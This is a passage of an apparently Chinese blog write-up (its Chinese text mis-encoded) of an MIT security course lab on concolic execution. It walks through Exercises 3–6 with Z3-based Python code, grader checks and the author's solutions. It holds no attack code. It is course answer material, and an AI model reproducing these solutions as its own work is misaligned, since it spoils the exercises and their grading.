concrete_values.</span><br>  concrete_values.mk_global()<br>  v = testfunc()<br><br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Test generated&#x27;</span>, <span class="hljs-built_in">len</span>(cur_path_constr), <span class="hljs-string">&#x27;branches:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> (c, caller) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(cur_path_constr, cur_path_constr_callers):<br>      <span class="hljs-built_in">print</span>(indent(z3expr(c)), <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;%s:%d&#x27;</span> % (caller[<span class="hljs-number">0</span>], caller[<span class="hljs-number">1</span>]))<br><br>  <span class="hljs-keyword">return</span> (v, cur_path_constr, cur_path_constr_callers)<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨è¯¥å‡½æ•°ä¸­å¹¶æ²¡æœ‰æ›´æ”¹è·¯å¾„çº¦æŸä¸ä¿¡æ¯çš„åˆ—è¡¨ï¼Œå®é™…ä¸Šè¿™åœ¨ <code>add_constr()</code> ä¸­å®Œæˆï¼Œè¯¥å‡½æ•°åœ¨ <code>concolic_bool()</code> ä¸­è°ƒç”¨ï¼Œå°†çº¦æŸä¿¡æ¯è¿›è¡Œæ·»åŠ ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_constr</span>(<span class="hljs-params">e</span>):<br>  <span class="hljs-keyword">global</span> cur_path_constr, cur_path_constr_callers<br>  cur_path_constr.append(simplify(e))<br>  cur_path_constr_callers.append(get_caller())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_bool</span>(<span class="hljs-params">sym, v</span>):<br>  <span class="hljs-comment">## Python claims that &#x27;bool&#x27; is not an acceptable base type,</span><br>  <span class="hljs-comment">## so it seems difficult to subclass bool.  Luckily, bool has</span><br>  <span class="hljs-comment">## only two possible values, so whenever we get a concolic</span><br>  <span class="hljs-comment">## bool, add its value to the constraint.</span><br>  add_constr(sym_eq(sym, ast(v)))<br>  <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>è€Œ <code>concolic_bool()</code> å®é™…ä¸Šåœ¨ <code>concolic_int</code> ä¸ <code>concolic_str</code> çš„è¿ç®—ç¬¦é‡è½½ä¸­è¿›è¡Œè°ƒç”¨ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæ¯æ¬¡æ‰§è¡Œ <code>concolic_exec_input()</code> éƒ½è¦<strong>é‡æ–°å°†è·¯å¾„çº¦æŸä¸ä¿¡æ¯åˆ—è¡¨æ¸…ç©º</strong>çš„ç¼˜æ•…ï¼Œè¿™é‡Œä»¥ <code>concolic_int </code>ä¸­çš„ <code>__cmp__</code> è¿ç®—ç¬¦ä¸ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__cmp__</span>(<span class="hljs-params">self, o</span>):<br>  res = <span class="hljs-built_in">int</span>(self.__v).__cmp__(<span class="hljs-built_in">int</span>(o))<br>  <span class="hljs-keyword">if</span> concolic_bool(sym_lt(ast(self), ast(o)), res &lt; <span class="hljs-number">0</span>):<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>  <span class="hljs-keyword">if</span> concolic_bool(sym_gt(ast(self), ast(o)), res &gt; <span class="hljs-number">0</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><hr><p>æˆ‘ä»¬æ¥ä¸‹æ¥æ¥çœ‹  <code>symex_exercises.py</code>  é‡Œæœ‰å•¥ï¼Œä¸»è¦å°±ä¸€ä¸ª <code>make_a_test()</code> å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å…¶ä¸­å®Œæˆå…¨å±€å…·ä½“å€¼å­—å…¸ <code>concrete_values</code> çš„æ„å»ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> symex.fuzzy <span class="hljs-keyword">as</span> fuzzy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_a_test_case</span>():<br>  concrete_values = fuzzy.ConcreteValues()<br>  <span class="hljs-comment">## Your solution here: add the right value to concrete_values</span><br>  <span class="hljs-keyword">return</span> concrete_values<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•ä¿®æ”¹   <code>symex_exercises.py</code> ä¸­åˆ›å»ºçš„å­—å…¸å‘¢ï¼Ÿæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ Exercise 3 çš„è¯„åˆ¤æ ‡å‡†ï¼Œåœ¨ <code>check_lab3.py</code> ä¸­æ£€æµ‹çš„æ˜¯è¿è¡Œ <code>check-symex-int.py</code> åè¦è¾“å‡º <code>&quot;Found input for 1234&quot;</code> å­—ç¬¦ä¸²ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_symex_int</span>():<br>    sh(<span class="hljs-string">&#x27;python3 check-symex-int.py &gt;/tmp/lab3.log&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Found input for 1234&#x27;</span> <span class="hljs-keyword">in</span> file_read(<span class="hljs-string">&#x27;/tmp/lab3.log&#x27;</span>):<br>        log(green(<span class="hljs-string">&quot;PASS&quot;</span>), <span class="hljs-string">&quot;Exercise 3: concrete input for 1234&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        log(red(<span class="hljs-string">&quot;FAIL&quot;</span>), <span class="hljs-string">&quot;Exercise 3: concrete input for 1234&quot;</span>)<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥ä¸‹æ¥æ¥çœ‹  <code>check-symex-int.py</code> ï¼Œå…¶å¼€å¤´çš„é€»è¾‘å¦‚ä¸‹ï¼Œ<code>r</code> çš„å€¼ä¸º 1234 å³å¯é€šè¿‡ Exercise 3ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## This test case checks that you provided the right input in symex_exercises.</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Calling f with a specific input..&#x27;</span>)<br>v = symex_exercises.make_a_test_case()<br>(r, constr, callers) = fuzzy.concolic_exec_input(test_f, v, verbose=<span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> r == <span class="hljs-number">1234</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Found input for 1234&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Input produced&quot;</span>, r, <span class="hljs-string">&quot;instead of 1234&quot;</span>)<br></code></pre></td></tr></table></figure><p>å¦‚å‰é¢æˆ‘ä»¬å¯¹ <code>concolic_exec_input()</code> çš„åˆ†æï¼Œ<code>r</code> çš„å€¼ç”±ä¼ å…¥çš„å‡½æ•°æŒ‡é’ˆå†³å®šï¼Œæ•…æˆ‘ä»¬æ¥çœ‹ <code>test_f()</code> çš„é€»è¾‘ï¼Œä¸»è¦å°±æ˜¯ç”¨ <code>mk_int()</code> ä»å…¨å±€å…·ä½“å€¼å­—å…¸ä¸­è·å– id ä¸º <code>i</code> çš„å€¼ä¼ å…¥ <code>f()</code> ä¸­è¿›è¡Œè¿ç®—ï¼Œè‹¥ä¸å­˜åœ¨ <code>i</code> åˆ™ <code>i</code> ä¼šè¢«é»˜è®¤èµ‹å€¼ <code>0</code> ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">if</span> x == <span class="hljs-number">7</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">100</span><br>    <span class="hljs-keyword">if</span> x*<span class="hljs-number">2</span> == x+<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">70</span><br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">2000</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">80</span><br>    <span class="hljs-keyword">if</span> x*<span class="hljs-number">2</span> == <span class="hljs-number">1000</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">30000</span><br>    <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">500</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">33</span><br>    <span class="hljs-keyword">if</span> x // <span class="hljs-number">123</span> == <span class="hljs-number">7</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1234</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">40</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_f</span>():<br>    i = fuzzy.mk_int(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">0</span>)<br>    v = f(i)<br>    <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>ç”±å‡½æ•° <code>f()</code> æˆ‘ä»¬å¯ä»¥çŸ¥é“çš„æ˜¯æˆ‘ä»¬åªéœ€è¦å‘å…·ä½“å€¼å­—å…¸ä¸­æ·»åŠ ä¸€ä¸ª <code>i = 123 * 7</code> çš„å€¼å³å¯è®© <code>test_f()</code> è¿”å› <code>1234</code>ï¼Œæ•…ä¿®æ”¹ <code>symex_exercises.py</code> å¦‚ä¸‹ï¼Œè¿™é‡Œç”¨ <code>mk_int()</code> å’Œ <code>add()</code> éƒ½å¯ä»¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> symex.fuzzy <span class="hljs-keyword">as</span> fuzzy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_a_test_case</span>():<br>  concrete_values = fuzzy.ConcreteValues()<br>  <span class="hljs-comment">## Your solution here: add the right value to concrete_values</span><br>  concrete_values.add(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">123</span> * <span class="hljs-number">7</span>)<br>  <span class="hljs-keyword">return</span> concrete_values<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 3ï¼š</p><p><img src="https://s2.loli.net/2022/12/18/f3HsgQFum1CZDij.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 4ï¼Œå®Œæˆ <code>symex/fuzzy.py</code> ä¸­ <code>concolic_find_input</code>  çš„å®ç°ï¼š</p><blockquote><p><strong>Exercise 4.</strong> Another major component in concolic execution is finding a concrete input for a constraint. Complete the implementation of <code>concolic_find_input</code> in <code>symex/fuzzy.py</code> and make sure you pass the second test case of <code>symex/check-symex-int.py</code>. For this exercise, you will have to invoke Z3, along the lines of <code>(ok, model) = fork_and_check(constr)</code> (see the comments in the code). Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>åœ¨è¯¥å‡½æ•°å½“ä¸­æˆ‘ä»¬éœ€è¦å®Œæˆå¯¹çº¦æŸçš„æ±‚è§£å¹¶è¿”å›å¯¹åº”çš„ç»“æœï¼Œå› æ­¤è¿™é‡Œéœ€è¦ä½¿ç”¨ Z3 æ±‚è§£å™¨æ¥å®Œæˆçº¦æŸæ±‚è§£è¿‡ç¨‹ï¼Œä¸è¿‡è¿™é‡Œå·²ç»å°†è°ƒç”¨ Z3 çš„æµç¨‹åœ¨ <code>fork_and_check()</code> ä¸­å®Œæˆå°è£…ï¼Œæˆ‘ä»¬åªéœ€è¦è°ƒç”¨è¯¥å‡½æ•°è¿›è¡Œæ±‚è§£å³å¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆæ¥çœ‹  <code>fork_and_check()</code> çš„å…·ä½“å®ç°ï¼š</p><ul><li>åˆ›å»ºå­è¿›ç¨‹è°ƒç”¨ <code>fork_and_check_worker()</code> è¿›è¡Œçº¦æŸæ±‚è§£ï¼Œçˆ¶å­è¿›ç¨‹é€šè¿‡ç®¡é“é€šä¿¡</li><li>çˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹çš„ <code>SIGALRM</code> ä¿¡å·ï¼Œè‹¥ <code>z3_timeout</code> ç§’åæœªæ”¶åˆ°ï¼Œæ€æ­»å­è¿›ç¨‹</li><li>ä»ç®¡é“æ¥æ”¶ç»“æœå¹¶è¿”å›ï¼Œè‹¥è¶…æ—¶ï¼ˆå­è¿›ç¨‹è¢«æ€ï¼Œç®¡é“å…³é—­ï¼‰åˆ™è¿”å› <code>(z3.unknown, None)</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Support for forking because z3 uses lots of global variables</span><br><br><span class="hljs-comment">## timeout for Z3, in seconds</span><br>z3_timeout = <span class="hljs-number">5</span><br><br><span class="hljs-comment">##...</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fork_and_check</span>(<span class="hljs-params">constr</span>):<br>  constr = simplify(constr)<br><br>  parent_conn, child_conn = multiprocessing.Pipe()<br>  p = multiprocessing.Process(target=fork_and_check_worker,<br>                              args=(constr, child_conn))<br>  p.start()<br>  child_conn.close()<br><br>  <span class="hljs-comment">## timeout after a while..</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">sighandler</span>(<span class="hljs-params">signo, stack</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Timed out..&quot;</span>)<br>    <span class="hljs-comment"># print z3expr(constr).sexpr()</span><br>    p.terminate()<br><br>  signal.signal(signal.SIGALRM, sighandler)<br>  signal.alarm(z3_timeout)<br><br>  <span class="hljs-keyword">try</span>:<br>    res = parent_conn.recv()<br>  <span class="hljs-keyword">except</span> EOFError:<br>    res = (z3.unknown, <span class="hljs-literal">None</span>)<br>  <span class="hljs-keyword">finally</span>:<br>    signal.alarm(<span class="hljs-number">0</span>)<br><br>  p.join()<br>  <span class="hljs-keyword">return</span> res<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹   <code>fork_and_check_workder()</code> çš„å…·ä½“å®ç°ï¼š</p><ul><li>æ–°å»ºä¸€ä¸ª Z3 æ±‚è§£å™¨å°†è½¬åŒ–ä¸ºå­—ç¬¦ä¸²çš„çº¦æŸè¡¨è¾¾å¼ä¼ å…¥ï¼Œè°ƒç”¨ <code>Solver.check()</code> æ±‚è§£</li><li>è‹¥æ±‚è§£æˆåŠŸï¼Œè°ƒç”¨ <code>Solver.model()</code> è·å¾—æ±‚è§£ç»“æœ</li><li>åˆ¤æ–­ç»“æœä¸­å˜é‡ç±»å‹å¹¶è½¬æ¢ä¸ºæ•´å‹&#x2F;å­—ç¬¦ä¸²ï¼Œå¯¹äºå­—ç¬¦ä¸²åšé¢å¤–å¤„ç†ï¼Œå°†ç»“æœæ”¾åˆ°ä¸€ä¸ª <code>å­—ç¬¦ä¸²â†’ç»“æœ</code> æ˜ å°„çš„å­—å…¸ä¸­å¹¶è¿”å›</li></ul><blockquote><p>Z3 è¿™ç©æ„ç”¨èµ·æ¥ç¡®å®æ–¹ä¾¿ï¼Œä¸æ„§æ˜¯å¾®è½¯<del>å¤§çˆ¹</del></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fork_and_check_worker</span>(<span class="hljs-params">constr, conn</span>):<br>  s = z3.Solver()<br>  s.add(z3expr(constr))<br>  ok = s.check()<br>  m = &#123;&#125;<br>  <span class="hljs-keyword">if</span> ok == z3.sat:<br>    z3m = s.model()<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> z3m:<br>      v = z3m[k]<br>      <span class="hljs-keyword">if</span> v.sort() == z3.IntSort():<br>        m[<span class="hljs-built_in">str</span>(k)] = v.as_long()<br>      <span class="hljs-keyword">elif</span> v.sort() == z3.StringSort():<br>        <span class="hljs-comment">## There doesn&#x27;t seem to be a way to get the raw string</span><br>        <span class="hljs-comment">## value out of Z3..  Instead, we get the escaped string</span><br>        <span class="hljs-comment">## value.  We need to jump through hoops to unescape it.</span><br>        x = v.as_string()<br>        u = x.encode(<span class="hljs-string">&#x27;latin1&#x27;</span>).decode(<span class="hljs-string">&#x27;unicode-escape&#x27;</span>)<br>        m[<span class="hljs-built_in">str</span>(k)] = u<br>      <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Unknown sort for %s=%s: %s&quot;</span> % (k, v, v.sort()))<br>  conn.send((ok, m))<br>  conn.close()<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬å¯ä»¥å®Œæˆ Exercise 4 äº†ï¼Œæˆ‘ä»¬åªéœ€è¦è°ƒç”¨  <code>fork_and_check()</code> è¿›è¡Œæ±‚è§£å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬è¿”å›çš„å­—å…¸ä¸­çš„é”®å€¼å¯¹åº”å½“åªåŒ…å« <code>ok_names</code> å‚æ•°ä¸­æ‰€éœ€è¦çš„é”®ï¼Œè‹¥ <code>ok_names == None</code> åˆ™å°†æ‰€æœ‰çš„é”®å€¼å¯¹æ·»åŠ åˆ°å­—å…¸ä¸­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Given a constraint, ask Z3 to compute concrete values that make that</span><br><span class="hljs-comment"># constraint true. It returns a new ConcreteValues instance with those</span><br><span class="hljs-comment"># values.  Z3 produces variables that don&#x27;t show up in our</span><br><span class="hljs-comment"># applications and in our constraints; we filter those by accepting</span><br><span class="hljs-comment"># only variables names that appear in ok_names.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_find_input</span>(<span class="hljs-params">constraint, ok_names, verbose=<span class="hljs-number">0</span></span>):<br>  <span class="hljs-comment">## Invoke Z3, along the lines of:</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">##     (ok, model) = fork_and_check(constr)</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## If Z3 was able to find example inputs that solve this</span><br>  <span class="hljs-comment">## constraint (i.e., ok == z3.sat), make a new input set</span><br>  <span class="hljs-comment">## containing the values from Z3&#x27;s model, and return it.</span><br>  (ok, model) = fork_and_check(constraint)<br>  cv = ConcreteValues()<br>  <span class="hljs-keyword">if</span> ok == z3.sat:<br>    sat = <span class="hljs-literal">True</span><br>    res_names = model.keys() <span class="hljs-keyword">if</span> ok_names <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> ok_names<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> res_names:<br>      cv.add(k, model[k])<br>  <span class="hljs-keyword">else</span>:<br>    sat = <span class="hljs-literal">False</span><br>  <span class="hljs-keyword">return</span> sat, cv<br></code></pre></td></tr></table></figure><p>æˆåŠŸé€šè¿‡ Exercise 4ï¼š</p><p><img src="https://s2.loli.net/2022/12/18/NJ32G9ogzOCEbPA.png" alt="image.png"></p><p>ç„¶åæ˜¯ Exercise 5ï¼Œ å®Œæˆ <code>symex/fuzzy.py</code> ä¸­ <code>concolic_force_branch</code>  çš„å®ç°ï¼š</p><blockquote><p>æå‰è¯´ä¸€ä¸‹ï¼Œè¿™ä¸ª Exercise 5 çš„æ£€æŸ¥<strong>éå¸¸æ¾</strong>ï¼Œä¸è¦ä»¥ä¸ºé€šè¿‡æ£€æŸ¥å°±æ˜¯çœŸçš„ Pass äº†ï¼Œæœ€å¥½è‡ªå·±å†çœ‹çœ‹ä»£ç é€»è¾‘æ˜¯å¦ç¬¦åˆè¦æ±‚â€¦</p></blockquote><blockquote><p><strong>Exercise 5.</strong> A final major component in concolic execution is exploring different branches of execution. Complete the implementation of <code>concolic_force_branch</code> in <code>symex/fuzzy.py</code> and make sure you pass the final test case of <code>symex/check-symex-int.py</code>. Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>æ­£å¦‚å‰æ–‡æ‰€è¯´ï¼Œåœ¨é‡åˆ°åˆ†æ”¯æ—¶æˆ‘ä»¬éœ€è¦<strong>é€†è½¬å½“å‰åˆ†æ”¯æ¡ä»¶ï¼Œä»¥æ¢ç´¢å¦ä¸€åˆ†æ”¯</strong>ï¼Œè¯¥å‡½æ•°çš„ä½œç”¨å®é™…ä¸Šå°±æ˜¯é€†è½¬ <code>branch_conds</code> ä¸­çš„ç¬¬ <code>b</code> åˆ†æ”¯çš„æ¡ä»¶ï¼Œå¹¶è¿”å›æ–°çš„çº¦æŸæ¡ä»¶é›†åˆï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å–å‡ºè¯¥æ¡ä»¶å¹¶ä½¿ç”¨ <code>sym_not()</code> å–ååå†ç”¨ <code>sym_and()</code> åŠ ä¸Šè¯¥åˆ†æ”¯ä¹‹å‰æ‰€æœ‰çš„æ¡ä»¶çº¦æŸå³å¯</p><p>æ³¨æ„è¿™é‡Œçš„å‚æ•° <code>b</code> ä¸ºåˆ†æ”¯æ ‡å·ï¼Œ<code>branch_conds</code> ä¸ <code>branch_callers</code> ä¸ºåˆ†æ”¯çš„æ¡ä»¶ä¸è°ƒç”¨è€…æ•°ç»„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Compute a new constraint by negating the branch condition of the</span><br><span class="hljs-comment"># b-th branch in branch_conds. This constraint can be used to force</span><br><span class="hljs-comment"># the concolic execution to explore the other side of branch b.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_force_branch</span>(<span class="hljs-params">b, branch_conds, branch_callers, verbose = <span class="hljs-number">1</span></span>):<br>  <span class="hljs-comment">## Compute an AST expression for the constraints necessary</span><br>  <span class="hljs-comment">## to go the other way on branch b.  You can use existing</span><br>  <span class="hljs-comment">## logical AST combinators like sym_not(), sym_and(), etc.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Note that some of the AST combinators take separate positional</span><br>  <span class="hljs-comment">## arguments. In Python, to unpack a list into separate positional</span><br>  <span class="hljs-comment">## arguments, use the &#x27;*&#x27; operator documented at</span><br>  <span class="hljs-comment">## https://docs.python.org/3/tutorial/controlflow.html#unpacking-argument-lists</span><br><br>  constraint = <span class="hljs-literal">None</span><br>  <span class="hljs-comment">## Exercise 5 by arttnba3</span><br>  <span class="hljs-comment">### negating the branch condition of the b-th branch</span><br>  b_cond = branch_conds[b]<br>  <span class="hljs-keyword">if</span> (b_cond != const_bool(<span class="hljs-literal">True</span>)):<br>    constraint = sym_not(b_cond)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b):<br>      constraint = sym_and(constraint, branch_conds[i])<br>  <span class="hljs-comment">### end</span><br><br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">2</span>:<br>    callers = branch_callers[b]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Trying to branch at %s:%d:&#x27;</span> % (callers[<span class="hljs-number">0</span>], callers[<span class="hljs-number">1</span>]))<br>    <span class="hljs-keyword">if</span> constraint <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>      <span class="hljs-built_in">print</span>(indent(z3expr(constraint).sexpr()))<br><br>  <span class="hljs-keyword">if</span> constraint <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">return</span> const_bool(<span class="hljs-literal">True</span>)<br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> constraint<br></code></pre></td></tr></table></figure><p>æˆåŠŸé€šè¿‡ Exercise 5ï¼š</p><p><img src="https://s2.loli.net/2022/12/18/dFbaOHEoCXG23L6.png" alt="image.png"></p><p>æœ€åæ˜¯ Exercise 6ï¼Œ <strong>ä½¿ç”¨æˆ‘ä»¬åœ¨ Exercise 3-5 ä¸­æ¶‰åŠçš„å‡ ä¸ªå‡½æ•°æ¥å®Œæˆ <code>concolic_execs()</code>â€”â€” å®Œæ•´çš„æ··åˆæ‰§è¡Œå‡½æ•°çš„æ„å»º</strong>ï¼Œæˆ‘ä»¬éœ€è¦å®Œæˆå¯¹ <code>func</code> ä¸­çš„<strong>æ¯ä¸€æ¡åˆ†æ”¯</strong>çš„æ‰§è¡Œï¼š</p><blockquote><p><strong>Exercise 6.</strong> Now implement concolic execution of a function in <code>concolic_execs()</code> in <code>symex/fuzzy.py</code>. The goal is to eventually cause every every branch of <code>func</code>to be executed. Read the comment for a proposed plan of attack for implementing that loop. The functions in the exercises 3-5 should be quite useful.</p><p>Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check that your <code>concolic_execs()</code> works correctly.</p><p>Beware that our check for this exercise is <em>not</em> complete. You may well find that later on something does not work, and you will have to revisit your code for this exercise.</p></blockquote><p>æˆ‘ä»¬å…ˆçœ‹ <code>concolic_execs()</code> ä¸­å·²æœ‰çš„é€»è¾‘æ¡†æ¶ï¼š</p><ul><li><code>checked</code> 